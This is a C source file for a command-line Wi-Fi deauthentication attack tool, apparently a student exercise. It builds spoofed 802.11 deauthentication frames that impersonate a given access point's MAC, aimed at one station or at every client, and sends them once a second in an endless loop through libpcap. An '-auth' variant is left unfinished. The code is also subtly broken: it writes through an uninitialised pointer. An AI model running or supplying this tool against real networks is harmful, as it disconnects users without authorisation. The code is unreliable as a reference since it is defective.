#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "pstruct.h"

u_int8_t ap_mac[6] = { 0, };
u_int8_t station_mac[6] = { 0, };
u_int8_t broadcast_mac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

void usage() {
	printf("syntax: deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
	printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

typedef struct {
	char* dev_;
	bool auth_flag;
} Param;

Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 3 || argc > 5) {
		usage();
		return false;
	}
	if(argc >= 3 && argc <= 5) {
		if(argc == 5) {
			if(strncmp(argv[4], "-auth", 5) == 0) {
				param->auth_flag = true;
			}
		}
		char *mac1 = strtok(argv[2], ":");
		int i = 0;
		while(i != 6) {
			ap_mac[i] = strtoul(mac1, NULL, 16);
			mac1 = strtok(NULL, ":");
			i++;
		}
		if(argc >= 4) {
			char *mac2 = strtok(argv[3], ":");
			int i = 0;
			while(i != 6) {
				station_mac[i] = strtoul(mac2, NULL, 16);
				mac2 = strtok(NULL, ":");
				i++;
			}
		}
		
	}
	
	param->dev_ = argv[1];	

	return true;
}



void set_mac(u_int8_t target[], u_int8_t value[]) {
	for(int i = 0; i < 6; i++) {
		target[i] = value[i];
	}
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}

	struct deauthentication_packet* deauth;

	memset(deauth, 0, sizeof(*deauth));

	deauth->radiotap.it_len = 0x8;
	deauth->deauth_header.type = 0xc0;
	if(argc == 3) {
		set_mac(deauth->deauth_header.dst_mac, broadcast_mac);	
	}
	else if(argc == 4) {
		set_mac(deauth->deauth_header.dst_mac, station_mac);			
	}
	set_mac(deauth->deauth_header.src_mac, ap_mac);
	set_mac(deauth->deauth_header.bss_id, ap_mac);
	deauth->fixed.reason_code = 0x7;

	if(param.auth_flag) {
		deauth->deauth_header.type = 0x0;
		set_mac(deauth->deauth_header.dst_mac, ap_mac);
		set_mac(deauth->deauth_header.src_mac, station_mac);
		set_mac(deauth->deauth_header.bss_id, ap_mac);
		deauth->fixed.reason_code = 0x0411;
		//not imp..
	}

	while (true) {
		int res = pcap_sendpacket(pcap, (u_char*)deauth, sizeof(deauthentication_packet));
		if (res != 0) {
			printf("pcap_sendpacket return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		printf("send packet\n");
		sleep(1);
	}
	pcap_close(pcap);
}
